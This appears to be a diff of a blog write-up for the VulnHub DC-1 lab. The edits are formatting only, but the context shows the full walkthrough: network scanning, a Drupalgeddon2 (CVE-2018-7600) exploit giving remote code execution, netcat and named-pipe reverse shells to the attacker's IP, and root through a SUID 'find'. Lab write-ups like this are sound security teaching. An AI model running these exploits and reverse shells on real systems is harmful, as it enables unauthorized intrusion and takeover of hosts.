@@ -1,22 +1,22 @@
 ---
-author: MaxisFront
-categories:
-- WriteUps
-date: 2026-03-16
-description: 'VulnHub DC:1 Machine | Challenge made by: DCAU | Series: DC'
-draft: false
-hideReadingTime: false
-image: Drupal_Logo.png
-tags:
-- VulnHub
-- Linux
-- Web
-- CMS
-- Drupal
-- CVE-2018-7600
-- SUID
-- GFTOBins
 title: 'WriteUp: DC-1 | VulnHub'
+date: 2026-03-16
+draft: false
+tags:
+  - VulnHub
+  - Linux
+  - Web
+  - CMS
+  - Drupal
+  - CVE-2018-7600
+  - SUID
+  - GFTOBins
+categories:
+  - WriteUps
+author: MaxisFront
+description: 'VulnHub DC:1 Machine | Challenge made by: DCAU | Series: DC'
+image: Drupal_Logo.png
+hideReadingTime: false
 ---
 > All rights reserved by the Drupal organization
 
@@ -27,7 +27,9 @@ title: 'WriteUp: DC-1 | VulnHub'
 - Service identification `Drupal 7` on port 80.
 - Exploitation of the `CVE-2018-7600` to gain access (Drupalgeddon2).
 - Exploiting SUID via the `find` to escalate to root.
-- Security recommendations to prevent and mitigate vulnerabilities on this machine. {{< /alert>}}
+- Security recommendations to prevent and mitigate vulnerabilities on this machine. 
+
+{{< /alert>}}
 
 #### Skills Used
 
@@ -63,7 +65,7 @@ arp-scan -I eth3 -l
 > - `-I`: interface: We specify the network interface where requests will be sent to identify devices.
 > - `-l`: Device discovery on our local subnet (--localnet).
 
-![Identifying the IP](./images/20260306192120.png)
+![Identifying the IP](images/20260306192120.png)
 
 The IP address of interest is `192.168.1.169`. We performed a connectivity test via `ping` to verify that it is possible to establish a connection between the target machine and ours.
 
@@ -79,7 +81,7 @@ ping -c1 192.168.1.169 -R
 > - `-c1`: We specify that only one packet be sent and that we wait to receive it.
 > - `-R`: We request that the packet’s route be traced to see if there is a direct connection or if the packet passes through nodes during the process (which can reduce the TTL value).
 
-![Testing the connection with the victim](./images/20260306195718.png)
+![Testing the connection with the victim](images/20260306195718.png)
 
 We can see that the route of our ICMP trace indicates a successful connection. On the other hand, a TTL value close to `64` usually implies that we are dealing with an OS `Linux/Unix` (although this is not a definitive identification).
 
@@ -108,7 +110,7 @@ nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 192.168.1.169
 >
 > On the other hand, if systems cannot handle receiving large numbers of packets, they could become temporarily overloaded, or the scan itself could produce false positives or negatives.
 
-![Nmap Scan](./images/20260307102017.png)
+![Nmap Scan](images/20260307102017.png)
 
 ### Port Scanning
 
@@ -122,7 +124,7 @@ nmap -sV -p22,80,111,57182 -oN ports-enumeration 192.168.1.169
 
 </div>
 
-![First port enumeration with -sV flag](./images/20260307103608.png)
+![First port enumeration with -sV flag](images/20260307103608.png)
 
 The scan results now show us the section `VERSION`. Although it contains valuable data, we can improve the quality of this data using the flag `-sC`, thanks to which `Nmap` will use a default set of `reconnaissance scripts` to gather even more information:
 
@@ -136,7 +138,7 @@ nmap -p22,80,111,57182 -sCV -oN ports-enumeration 192.168.1.169
 
 > It is possible to chain the flags `-sV and -sC`, resulting in `-sCV`.
 
-![Second port enumeration with -sCV flag](./images/20260307103859.png)
+![Second port enumeration with -sCV flag](images/20260307103859.png)
 
 After analyzing the port enumeration, we can summarize the results in the following table:
 
@@ -160,13 +162,13 @@ Based on the table, we can identify potential attack vectors:
 
 A service is running on port 80 `http`, which, upon visiting, indicates that—as previously mentioned—it uses the "`Drupal 7`":
 
-![Home of the Drupal 7 web page](./images/20260307120546.png)
+![Home of the Drupal 7 web page](images/20260307120546.png)
 
 > In web penetration testing environments, it is a good idea to try common credentials, such as `admin:admin` or `user:password`. This is often the case with older systems that receive irregular maintenance.
 
 Although the web system is old, it does not have common credentials. Despite this, there is another area of interest: `Create new account`:
 
-![Identifying the admin account](./images/20260307121144.png)
+![Identifying the admin account](images/20260307121144.png)
 
 We observe that `Drupal 7` it tells us that "`The name admin is already taken`". This could be useful for trying common passwords again, but that is not the case. Therefore, we will continue with the enumeration of the website.
 
@@ -184,7 +186,7 @@ Therefore, since *`Drupal 7`* is an older version, it likely has a significant n
 
 A quick Google search yields the following:
 
-![Gathering information about the SA-Core-2018-002 Vulnerability](./images/20260307122506.png)
+![Gathering information about the SA-Core-2018-002 Vulnerability](images/20260307122506.png)
 
 [Drupal - SA-Core-2018-002](https://www.drupal.org/sa-core-2018-002)
 
@@ -214,7 +216,7 @@ python3 drupa7-CVE-2018-7600.py -c 'whoami' http://192.168.1.169/
 
 </div>
 
-![Using the CVE-2018-7600 python exploit to get access](./images/20260307134239.png)
+![Using the CVE-2018-7600 python exploit to get access](images/20260307134239.png)
 
 This confirms that we have remote code execution capabilities. Therefore, to streamline the exploitation and privilege escalation process, we will establish a reverse shell:
 
@@ -243,7 +245,7 @@ python3 drupa7-CVE-2018-7600.py -c 'nc -e /bin/bash $IP 4444' http://192.168.1.1
 >
 > Despite this, it is possible to establish a reverse shell via `Named Pipes`: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $IP 4444 > /tmp/f`.
 
-![Listing the /var/www/html content](./images/20260307135039.png)
+![Listing the /var/www/html content](images/20260307135039.png)
 
 We list the contents of the current working directory. Perfect! There’s just one small detail: Our reverse shell isn’t interactive. Commands like `CTRL + C` will close the console, for example.
 
@@ -268,7 +270,7 @@ export TERM=xterm
 
 Now we have a `fully interactive shell`:
 
-![Interactive Reverse Shell established](./images/20260307135813.png)
+![Interactive Reverse Shell established](images/20260307135813.png)
 
 ## Privilege Escalation
 
@@ -290,13 +292,13 @@ find / -perm -4000 -user root 2>/dev/null
 > - `-user root`: We specify that the files must belong to the root user.
 > - `2>/dev/null`: We redirect errors to /dev/null to hide them and focus only on valid responses.
 
-![Identifying the find binary with the SUID bit](./images/20260307141326.png)
+![Identifying the find binary with the SUID bit](images/20260307141326.png)
 
 ### Exploiting Find's SUID
 
 Among all the responses, a critical SUID can be observed: `/usr/bin/find`. If we search GFTOBins, we see a crucial command:
 
-![Using GFTOBins to get root privileges](./images/20260307142638.png)
+![Using GFTOBins to get root privileges](images/20260307142638.png)
 
 The `SUID` binary `find` allows us to execute the commands interpreter (`sh`) via the following command:
 
@@ -314,7 +316,7 @@ find . -exec /bin/sh \; -quit
 
 > It is important to note that the bit `SUID` in the command `find` allows subsequent commands (such as /bin/sh) to run with the file owner’s privileges, i.e., *`root`*.
 
-![Finally getting root privileges](./images/20260307141718.png)
+![Finally getting root privileges](images/20260307141718.png)
 
 We have administrator permissions! For the final check, we can try to read the flag located in the directory `/root`:
 
